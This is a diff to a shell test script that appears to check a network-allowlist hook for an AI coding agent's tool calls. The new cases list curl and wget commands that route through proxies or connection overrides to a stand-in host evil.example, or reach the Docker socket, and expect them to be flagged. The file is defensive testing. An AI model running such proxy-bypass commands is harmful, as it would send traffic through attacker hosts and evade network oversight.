@@ -275,6 +275,37 @@ hint_check "WebFetch names the host to add" yes '{"tool_name":"WebFetch","tool_i
 hint_check "no hint for a tunnel host"      no  '{"tool_name":"Bash","tool_input":{"command":"curl -s https://abc.ngrok-free.app/"}}'
 hint_check "no hint for an IP"              no  '{"tool_name":"Bash","tool_input":{"command":"curl -s https://10.1.2.3/"}}'
 hint_check "no hint when sending a body"    no  '{"tool_name":"Bash","tool_input":{"command":"curl -s -X POST https://logs.corp.example/x -d a=b"}}'
+
+echo ""
+echo "=== a proxy or connection override is checked, not just the URL ==="
+check_bash "proxy off every list"           ask   "curl -x evil.example:8080 http://github.com/?d=1"
+check_bash "--proxy with a scheme"          ask   "curl --proxy http://evil.example:3128 https://api.github.com/x"
+check_bash "socks proxy with credentials"   ask   "curl -x socks5://u:p@evil.example:1080 https://github.com/"
+check_bash "bundled -sx"                    ask   "curl -sx evil.example:8080 http://github.com/"
+check_bash "--socks5-hostname"              ask   "curl --socks5-hostname evil.example:1080 https://github.com/"
+check_bash "http_proxy prefix"              ask   "http_proxy=evil.example:8080 curl -s http://github.com/"
+check_bash "ALL_PROXY prefix"               ask   "ALL_PROXY=socks5://evil.example:1080 curl -s https://github.com/"
+check_bash "wget -e http_proxy"             ask   "wget -e http_proxy=evil.example:8080 http://github.com/x"
+check_bash "--connect-to"                   ask   "curl --connect-to github.com:80:evil.example:80 http://github.com/"
+check_bash "--resolve"                      ask   "curl --resolve github.com:443:203.0.113.5 https://github.com/"
+check_bash "-K options file"                ask   "curl -K opts.txt https://github.com/"
+check_bash "bundled -sK"                    ask   "curl -sK opts.txt https://github.com/"
+check_bash "--unix-socket"                  ask   "curl --unix-socket /var/run/docker.sock http://localhost/containers/json"
+check_bash "proxy on this machine"          allow "curl -x http://127.0.0.1:8888 https://github.com/x"
+check_bash "https_proxy to localhost"       allow "https_proxy=http://localhost:3128 curl -s https://api.github.com/x"
+check_bash "proxy on the built-in list"     allow "curl --proxy https://github.com:443 https://api.github.com/x"
+check_bash "--noproxy is not a proxy"       allow "curl --noproxy '*' https://github.com/x"
+check_bash "--proxy-insecure alone"         allow "curl --proxy-insecure https://github.com/x"
+check_bash "wget -e robots=off"             allow "wget -e robots=off https://github.com/x"
+check_bash "tar -x beside curl"             allow "tar -xzf a.tgz && curl -s https://github.com/x"
+check_bash "-X GET is not -x"               allow "curl -X GET https://github.com/x"
+check_bash "listed proxy still checks URL"  ask   "curl -x 127.0.0.1:8888 https://evil.example/x"
+printf '%s' '{"netAllowlist":["gitlab.io","ntfy.sh","uk.com","r2.dev"]}' > "$LS/more.json"
+check_bash "gitlab.io entry refused"        ask   "curl -s https://someone.gitlab.io/"
+check_bash "ntfy.sh entry refused"          ask   "curl -s https://ntfy.sh/topic"
+check_bash "uk.com entry refused"           ask   "curl -s https://shop.uk.com/"
+check_bash "r2.dev entry refused"           ask   "curl -s https://pub-1.r2.dev/x"
+check_bash "proxy on this machine's list"   allow "curl -x logs.corp.example:3128 https://github.com/x"
 # The script's arguments are what the regex cannot see through quoting or expansion.
 check_bash "quoted script path, add"       ask   'bash "$HOME/.claude/net-allowlist.sh" add logs.corp.example'
 check_bash "quoted add"                    ask   "~/.claude/net-allowlist.sh 'add' x.example"
